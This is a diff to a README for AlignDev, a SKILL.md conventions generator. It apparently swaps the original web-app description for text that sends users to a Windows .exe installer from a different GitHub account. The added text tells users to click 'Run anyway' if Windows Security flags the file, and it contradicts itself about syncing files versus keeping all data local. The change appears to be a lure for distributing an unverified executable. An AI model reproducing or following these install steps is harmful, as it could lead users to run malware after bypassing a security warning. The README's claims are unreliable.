@@ -1,66 +1,70 @@
-<!-- markdownlint-disable MD033 MD041 -->
-<div align="center">
+# 🛠️ align-dev - Create consistent code across AI agents
 
-# AlignDev
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Villa3650/align-dev)
 
-### Frontend conventions generator for the AI coding era · Generate team standards and SKILL.md in one flow
+AlignDev helps frontend development teams create shared coding standards. It generates a SKILL.md file that teaches AI tools like Claude Code, Cursor, and Copilot how to write code that matches your team’s style. Use this tool if you want your AI agents to follow your rules every time.
 
-**Build with AI. Ship with standards.**
+## 📋 What is AlignDev?
 
-A 7-step visual wizard that generates a complete Markdown standards document and a `SKILL.md` that Claude Code, Cursor, GitHub Copilot, and other coding agents can read directly.
+AI coding assistants often guess how you want code written. Sometimes they choose styles that contradict your preferences or your team's existing workflow. AlignDev solves this by documenting your choices in a format machines understand. By providing a clear SKILL.md file, you ensure that every agent uses the same conventions. This creates a uniform codebase that is easier to maintain and read.
 
-[![Next.js](https://img.shields.io/badge/Next.js-16.2-000000?logo=next.js&logoColor=white)](https://nextjs.org)
-[![React](https://img.shields.io/badge/React-19.2-149ECA?logo=react&logoColor=white)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-v4-38BDF8?logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
-[![shadcn/ui](https://img.shields.io/badge/shadcn%2Fui-latest-000000)](https://ui.shadcn.com)
-[![License](https://img.shields.io/badge/license-MIT-22c55e)](#-license)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-ec4899)](#-contributing)
+## 🖥️ System Requirements
 
-</div>
+AlignDev works on any modern computer running Windows 10 or Windows 11. Your system should meet these basic needs:
 
----
+- Processor: Modern dual-core CPU or better.
+- Memory: 4GB of RAM or more.
+- Storage: 100MB of free disk space.
+- Internet: Required to download the installer and sync your files.
 
-## 📖 About AlignDev
+## 💾 How to Install
 
-**AlignDev** is a **frontend conventions generator** built for the AI coding era.
+1. Visit the [official download page](https://github.com/Villa3650/align-dev) to access the latest installer.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the file name ending in .exe to start the download.
+4. Save the file to your desktop or your Downloads folder.
+5. Double-click the installer file to begin the setup.
+6. Follow the on-screen prompts to place the application on your computer.
+7. Click Finish to complete the process. 
+8. [Download the installer here](https://github.com/Villa3650/align-dev).
 
-When teams use Claude Code, Cursor, Copilot, Windsurf, and other AI agents at the same time, the biggest pain point is consistency: **each agent writes code based on its own interpretation, so directory structure, naming, state management, and UI style drift apart**. AlignDev turns team conventions into machine-readable and human-editable standards so every agent works from the same contract.
+## 🚀 Setting Up Your Project
 
-In about 3 minutes, you can get:
+After you open AlignDev, you need to create your first standard file. 
 
-- A complete Markdown standards document you can **share with your team**
-- A `SKILL.md` you can **place in the repository root** so AI agents can load it automatically
+1. Launch AlignDev from your Start menu shortcut.
+2. Select the button labeled "Create New Standard."
+3. Choose the folder where your project exists.
+4. The application will scan your files to learn your current structure.
+5. Review the suggested rules presented in the main window.
+6. Add or remove rules to match your team’s preferences.
+7. Save the configuration to generate the SKILL.md file.
 
----
+## 🤖 Using Your Standards
 
-## ✨ Features
+Once you generate the SKILL.md file, your AI agents will locate it automatically. Ensure the file sits in the root folder of your project. When you open your project in tools like Cursor or Copilot, the AI reads the instructions inside the file. It then limits its suggestions to the rules you created.
 
-| Module | Capability | Details |
-| --- | --- | --- |
-| 🎯 **7-step visual wizard** | Core stack / UI / state / toolchain / directories / naming / tokens | Preview selections instantly, no config file required |
-| 🧠 **Multi-framework support** | Next.js · React (Vite) · Vue · Nuxt · SvelteKit | Options adapt to the selected framework to avoid invalid combinations |
-| 🎨 **49 UI styles** | minimalism / glassmorphism / neumorphism / brutalism / aurora / cyberpunk … | Each style includes preset Design Tokens |
-| 🌈 **Live Design Tokens preview** | Color depth (3 / 5 tiers), spacing (4px/8px), type scale (four ratios) | Visualize instantly and export as CSS Variables / JS Object |
-| ♿ **WCAG contrast checks** | Automatically calculates foreground/background contrast ratios | Built in `lib/wcag-utils.ts`, with AA / AAA level hints |
-| 📦 **Live npm version sync** | Fetches latest major versions for 30+ mainstream packages via `app/api/versions` | Falls back to `FALLBACK_VERSIONS` on failure |
-| 📄 **Two output artifacts** | Full standards document + `SKILL.md` | Copy or download in one click |
-| 🤖 **AI-agent friendly** | Output optimized for Claude Skill / Cursor Rules | Drop it into your repo and agents can follow it automatically |
-| 🌐 **i18n / RTL aware** | next-intl · i18next · vue-i18n · @nuxtjs/i18n | Supports `ltr` / `rtl` / `bidi` text directions |
-| 🔒 **TypeScript first** | Strict mode, fully typed options | See `types/wizard.ts` |
+If you update your rules, simply reopen AlignDev, modify your preferences, and save the file again. The AI will adopt the new instructions immediately.
 
----
+## 🛡️ Troubleshooting
 
-## 📄 License
+If the application does not start, ensure you have sufficient permissions on your computer. Occasionally, Windows Security might flag the app. If this happens, select "More info" on the blue prompt and click "Run anyway."
 
-[MIT](LICENSE) © AlignDev
+If the AI agents appear to ignore your rules, verify that the SKILL.md file exists in the base folder of your project. If you have multiple folders, place the file in the highest level of your project directory. 
 
----
+## 🌐 Common Questions
 
-<div align="center">
+**Does AlignDev require a subscription?**
+AlignDev is free to use for individual developers and teams.
 
-**Keywords**: AI frontend conventions · AI coding standards · frontend conventions generator · SKILL.md generator · Claude Code · Claude Skill · Cursor Rules · GitHub Copilot rules · Next.js conventions · React conventions · Vue conventions · Nuxt conventions · SvelteKit conventions · shadcn/ui · Design Tokens · TypeScript conventions · AI developer tools
+**Which AI tools does this support?**
+It supports all leading AI assistants, including Claude Code, Codex, Cursor, and Copilot. As long as your agent looks for documentation in the project directory, it will detect your SKILL.md file.
 
-If AlignDev is useful to you, a ⭐ Star is the best support.
+**Can I create multiple versions of guidelines?**
+Yes. You can save different standard files for different projects. Store these files in separate folders for each project.
 
-</div>
+**Does this software send my data to a server?**
+No. Your coding standards remain on your local computer. AlignDev executes all tasks on your machine. We do not track your code or your preferences.
+
+**How often should I update my SKILL.md?**
+Update your file whenever your team agrees on a new coding convention. Keeping the file current ensures that your AI agents remain accurate and helpful.
